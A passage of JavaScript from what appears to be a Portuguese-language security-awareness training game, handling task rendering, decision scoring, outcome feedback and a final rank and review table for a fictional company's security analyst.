        <div class="inspector-title">🔍 ${task.inspector.label}</div>
        <div class="url-inspector-card">
          <span class="url-label">DETALHES TÉCNICOS DE REDE / DESTINO:</span>
          <span class="url-dest">${task.inspector.dest}</span>
          <small style="color: var(--text-dim); margin-top: 4px;">${task.inspector.details}</small>
        </div>
      `;
    }

    // Render Actions
    let actionButtonsHtml = task.actions.map(action => {
      let btnClass = 'btn-secondary';
      if (action.type === 'danger') btnClass = 'btn-danger';
      if (action.type === 'success') btnClass = 'btn-success';
      if (action.type === 'warning') btnClass = 'btn-warning';

      return `
        <button class="btn-action ${btnClass}" data-action-id="${action.id}">
          ${action.label}
        </button>
      `;
    }).join('');

    this.taskActionsView.innerHTML = `
      <span class="action-prompt">Qual é a sua decisão de segurança?</span>
      ${actionButtonsHtml}
    `;

    // Attach click handlers to action buttons
    this.taskActionsView.querySelectorAll('.btn-action').forEach(btn => {
      btn.addEventListener('click', (e) => {
        const actionId = e.currentTarget.getAttribute('data-action-id');
        const selectedAction = task.actions.find(a => a.id === actionId);
        this.processDecision(task, selectedAction);
      });
    });
  }

  processDecision(task, action) {
    if (action.correct) {
      audio.success();
      this.threatsBlocked++;
    } else {
      audio.danger();
    }

    this.health = Math.max(0, this.health + action.healthDelta);
    this.reputation = Math.max(0, this.reputation + action.repDelta);

    this.decisionsHistory.push({
      taskTitle: task.title,
      channel: task.channel,
      chosenAction: action.label,
      correct: action.correct,
      title: action.title,
      consequence: action.consequence,
      explanation: action.explanation
    });

    this.updateDashboard();

    // Show Outcome Modal
    this.outcomeIcon.textContent = action.correct ? '🛡️' : '🚨';
    this.outcomeTitle.textContent = action.title;
    this.outcomeTitle.style.color = action.correct ? 'var(--emerald)' : 'var(--danger)';

    this.outcomeConsequence.className = `outcome-consequence ${action.correct ? 'outcome-success' : 'outcome-failure'}`;
    this.outcomeConsequence.innerHTML = `<strong>Resultado:</strong> ${action.consequence}`;

    this.outcomeExplanation.innerHTML = `<strong>Análise Técnica:</strong> ${action.explanation}`;

    this.outcomeModal.style.display = 'flex';
  }

  advanceToNextTask() {
    this.currentIndex++;
    if (this.health <= 0) {
      this.finishGame(true); // Game Over by breach
    } else if (this.currentIndex >= SCENARIOS.length) {
      this.finishGame(false); // Completed all tasks
    } else {
      this.renderTaskList();
      this.loadTask(this.currentIndex);
    }
  }

  finishGame(isCompromised = false) {
    this.activeTaskScreen.style.display = 'none';
    this.gameOverScreen.style.display = 'flex';

    const finalHealthEl = document.getElementById('final-health');
    const finalRepEl = document.getElementById('final-rep');
    const finalThreatsEl = document.getElementById('final-threats');
    const finalRankBadge = document.getElementById('final-rank-badge');
    const finalVerdictTitle = document.getElementById('final-verdict-title');
    const finalVerdictDesc = document.getElementById('final-verdict-desc');
    const finalScoreTitle = document.getElementById('final-score-title');
    const logContainer = document.getElementById('final-log-container');

    finalHealthEl.textContent = `${this.health}%`;
    finalRepEl.textContent = `${this.reputation} pts`;
    finalThreatsEl.textContent = `${this.threatsBlocked}/${SCENARIOS.length}`;

    if (isCompromised || this.health <= 0) {
      audio.alert();
      finalRankBadge.textContent = 'DEMISSÃO POR JUSTA CAUSA // INCIDENTE CRÍTICO';
      finalRankBadge.style.color = 'var(--danger)';
      finalRankBadge.style.borderColor = 'var(--danger)';
      finalVerdictTitle.textContent = '🚨 VAZAMENTO MACIÇO DE DADOS & COMPROMETIMENTO';
      finalVerdictDesc.textContent = 'A infraestrutura da TechCore foi violada devido a aprovações indevidas e credenciais vazadas em phishing.';
      finalScoreTitle.textContent = 'Fired / Security Disaster';
      finalScoreTitle.className = 'value text-danger';
    } else if (this.threatsBlocked >= 9 && this.reputation >= 90) {
      audio.success();
      finalRankBadge.textContent = 'CISO APPROVED // PROMOÇÃO A SÊNIOR';
      finalRankBadge.style.color = 'var(--emerald)';
      finalRankBadge.style.borderColor = 'var(--emerald)';
      finalVerdictTitle.textContent = '🏆 DEFESA CIBERNÉTICA IMPECÁVEL!';
      finalVerdictDesc.textContent = 'Você identificou com precisão todos os ataques de phishing, supply chain no CI/CD e backdoors na TechCore.';
      finalScoreTitle.textContent = 'Staff SecOps Lead';
      finalScoreTitle.className = 'value text-emerald';
    } else if (this.health >= 50 && this.threatsBlocked >= 6) {
      finalRankBadge.textContent = 'AUDITORIA CONCLUÍDA COM RESSALVAS';
      finalVerdictTitle.textContent = '⚠️ ADVERTÊNCIA FORMAL & RETREINAMENTO';
      finalVerdictDesc.textContent = 'A empresa sobreviveu ao expediente, mas algumas ameaças passaram despercebidas ou solicitações válidas foram barradas.';
      finalScoreTitle.textContent = 'Junior IT Analyst';
      finalScoreTitle.className = 'value text-amber';
    } else {
      audio.danger();
      finalRankBadge.textContent = 'DESEMPENHO INSUFICIENTE';
      finalVerdictTitle.textContent = '❌ RISCO GRAVE À INFRAESTRUTURA';
      finalVerdictDesc.textContent = 'Diversos ataques passaram pelo filtro da estação de trabalho.';
      finalScoreTitle.textContent = 'Probation / Suspended';
      finalScoreTitle.className = 'value text-danger';
    }

    // Render Log Table
    let tableRows = this.decisionsHistory.map((item, idx) => `
      <tr>
        <td><strong>#${idx + 1}</strong></td>
        <td><span class="item-tag ${item.channel === 'email' ? 'tag-email' : (item.channel === 'github' ? 'tag-github' : 'tag-iam')}">${item.channel.toUpperCase()}</span></td>
        <td>${this.escapeHtml(item.taskTitle)}</td>
        <td><strong style="color: ${item.correct ? 'var(--emerald)' : 'var(--danger)'};">${item.correct ? '✅ ACERTO' : '❌ FALHA'}</strong></td>
        <td style="font-size: 11px; color: var(--text-muted);">${this.escapeHtml(item.consequence)}</td>
      </tr>
    `).join('');

    logContainer.innerHTML = `
      <table class="review-table">
        <thead>
          <tr>
            <th>#</th>
            <th>Módulo</th>
            <th>Solicitação</th>
            <th>Status</th>
            <th>Consequência Técnica</th>
          </tr>
        </thead>
        <tbody>
          ${tableRows}
        </tbody>
      </table>
    `;
  }

  escapeHtml(str) {
    if (!str) return '';
    return str
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#039;');
  }
}

// Bootstrap Game on Window Load
window.addEventListener('DOMContentLoaded', () => {
  window.techCoreGame = new TechCoreGame();
});
